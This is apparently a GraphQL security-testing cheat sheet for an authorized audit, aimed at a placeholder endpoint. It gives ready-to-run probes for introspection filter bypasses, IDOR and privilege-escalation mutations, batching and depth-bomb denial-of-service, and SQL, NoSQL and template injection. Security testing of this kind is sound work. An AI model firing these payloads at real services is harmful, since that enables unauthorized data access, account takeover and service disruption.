# GraphQL Example Queries

Generic example queries and mutations for testing a GraphQL endpoint you are authorized to audit. **Every endpoint below is the placeholder `https://api.example.com/graphql`** — substitute your own in-scope target. Placeholder values (`USER_ID`, `OTHER_USER_ID`, `TOKEN`, `example.com`) must be replaced with your own test data. Do not point these at any real third-party service.

## Baseline

Minimal query — use it to confirm the endpoint works and to measure baseline response time.

```graphql
query {
  __typename
}
```

```bash
curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __typename }"}'
```

## Introspection

### Quick check — is introspection enabled?

```graphql
query {
  __schema {
    queryType {
      name
    }
  }
}
```

```bash
curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}'
```

### Full schema dump

Save the result to a file and explore it with a schema viewer (e.g. graphql-voyager) or the InQL Burp extension.

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType { kind name }
            }
          }
        }
      }
    }
  }
}
```

### Single-type probe

Useful when full introspection is blocked — `__type` is often missed by blocklists.

```graphql
query {
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```

## Introspection Bypass Attempts

Try these only if `__schema` is blocked. Each targets a different naive filter.

```graphql
# Newline injection inside the keyword
query {
  __schema
  { queryType { name } }
}

# Fragment trick
fragment f on __Schema { queryType { name } }
query { ...f }

# GET instead of POST (some servers filter only POST)
# GET https://api.example.com/graphql?query={__schema{queryType{name}}}

# Content-Type switching (some filters only inspect application/json)
# POST with: Content-Type: application/graphql
# Body (raw GraphQL, not JSON):
# { __schema { queryType { name } } }

# Comment injection to break keyword matching
query {
  __sch#comment
  ema { queryType { name } }
}
```

## Field Enumeration (Introspection Off)

### Typo probe — trigger a field suggestion

```graphql
query {
  usr {
    id
  }
}
```

A helpful error such as `Cannot query field "usr" ... Did you mean "user"?` leaks a real field name. Repeat with different typos and type names to build the schema by hand, or automate it with clairvoyance.

### Known-type probes

```graphql
query {
  __type(name: "User") { fields { name } }
}
```

```graphql
query {
  __type(name: "Query") { fields { name } }
}
```

```graphql
query {
  __type(name: "Mutation") { fields { name } }
}
```

## Authorization Tests

Run each of these twice: once with **no** credentials, and once authenticated as a low-privilege test user.

### Unauthenticated sensitive query

```graphql
query {
  users {
    id
    email
    role
  }
}
```

### Object-by-ID (IDOR probe)

Authenticated as test user A, request test user B's object. Replace `OTHER_USER_ID` with a second test account you control.

```graphql
query {
  user(id: "OTHER_USER_ID") {
    email
    phone
    address
  }
}
```

```graphql
query {
  order(id: "OTHER_ORDER_ID") {
    total
    items { name }
    user { email }
  }
}
```

### Field-level access on your own object

```graphql
query {
  me {
    id
    email
    role
    isAdmin
    internalNote
  }
}
```

### Privileged mutation as a regular user

```graphql
mutation {
  updateUser(id: "OTHER_USER_ID", role: "admin") {
    success
  }
}
```

```graphql
mutation {
  updateUserRole(userId: "OWN_USER_ID", role: "ADMIN") {
    success
  }
}
```

### Deprecated-field probe

Deprecated fields are often forgotten by auth checks. Query them with the same privileged-field set as above, e.g.:

```graphql
query {
  userProfile(id: "OTHER_USER_ID") {
    legacyToken
    adminFlags
  }
}
```

## Batching Examples

### Array batching — 100 queries in one request

Generate the batch and measure the response time against a single query. A large time delta (or a 200 OK for all 100) shows batching is unguarded.

```bash
python3 -c "
import json
q = {'query': '{ __typename }'}
print(json.dumps([q] * 100))
" | curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

### Alias batching — many resolver calls in one query

Each alias is a separate resolver call, so this bypasses per-query limits.

```bash
python3 -c "
aliases = ' '.join(f'q{i}: __typename' for i in range(500))
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

### Alias enumeration — many object IDs in one request

```bash
python3 -c "
import json
aliases = [f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1, 51)]
print(json.dumps({'query': '{ ' + ' '.join(aliases) + ' }'}))
" | curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

## Depth Bomb

A circular-reference query that grows with depth. Increase the depth and watch response time; linear growth with no error means no depth limit.

```bash
python3 -c "
depth = 20
inner = 'id email'
for _ in range(depth):
    inner = f'friends {{ id {inner} }}'
print('{\"query\": \"{ me { ' + inner + ' } }\"}')
" | curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

## Injection Probes via Arguments

Arguments flow into resolvers — test them like any other input.

### SQL injection probe (search / filter arguments)

```graphql
query {
  users(search: "admin'--") {
    id
    email
  }
}
```

### Time-based blind SQL injection probe

```graphql
query {
  users(id: "1 AND SLEEP(5)--") {
    email
  }
}
```

### NoSQL injection probe (MongoDB-style backends)

```graphql
# Operator injection via JSON coercion — only valid where the
# backend accepts object-typed arguments.
query {
  login(username: { "$gt": "" }, password: { "$gt": "" }) {
    token
  }
}
```

### Template injection probe (writable text fields)

```graphql
mutation {
  updateProfile(bio: "{{7*7}}") {
    bio
  }
}
```

Read the field back: if it renders as `49`, the value is evaluated as a template.

## Subscription Probe

Over WebSocket (`wss://api.example.com/graphql`, subprotocol `graphql-ws`), subscribe to another user's events. Replace `OTHER_USER_ID` with a second test account you control.

```bash
wscat -c wss://api.example.com/graphql \
  -s 'graphql-ws' \
  --execute '{"type":"start","id":"1","payload":{"query":"subscription { orderUpdated(userId: OTHER_USER_ID) { status total } }"}}'
```

Also check whether the subscription delivers events for **all** users with no per-user scoping.

## Authenticated Requests

Pass credentials the way the target expects — cookie or bearer token — using your own authorized test account.

```bash
# Cookie auth
curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=YOUR_TEST_SESSION_COOKIE' \
  -d '{"query":"{ me { id email } }"}'

# Bearer token auth
curl -s -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TEST_TOKEN' \
  -d '{"query":"{ me { id email } }"}'
```
